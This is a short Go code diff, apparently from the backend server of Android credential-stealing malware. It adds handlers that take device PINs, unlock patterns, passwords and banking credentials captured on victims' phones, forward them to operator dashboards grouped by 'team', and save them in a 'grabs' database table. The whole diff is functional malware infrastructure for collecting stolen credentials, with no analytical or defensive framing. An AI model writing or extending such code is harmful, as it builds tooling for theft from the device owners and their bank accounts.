@@ -530,10 +530,28 @@ func handleDeviceMessageInner(dc *DeviceConn, msg map[string]any, depth int) {
 		handleDeviceMessageDepth(dc, msg, depth+1)
 		return
 
+	case "pin_captured", "pattern_captured", "password_captured":
+		msg["device_id"] = dc.ID
+		H.NotifyPanels(dc.TeamID, msg)
+		go saveGrab(dc.ID, dc.TeamID, msgType, msg)
+
+	case "bank_cred_captured":
+		msg["device_id"] = dc.ID
+		H.NotifyPanels(dc.TeamID, msg)
+		go saveGrab(dc.ID, dc.TeamID, msgType, msg)
+
 	default:
 		msg["device_id"] = dc.ID
 		H.NotifyPanels(dc.TeamID, msg)
 	}
+}
+
+func saveGrab(deviceID, teamID, grabType string, msg map[string]any) {
+	data, _ := json.Marshal(msg)
+	db.DB.Exec(
+		"INSERT INTO grabs (device_id, team_id, grab_type, data) VALUES (?, ?, ?, ?)",
+		deviceID, teamID, grabType, string(data),
+	)
 }
 
 func HandlePanelWS(w http.ResponseWriter, r *http.Request) {
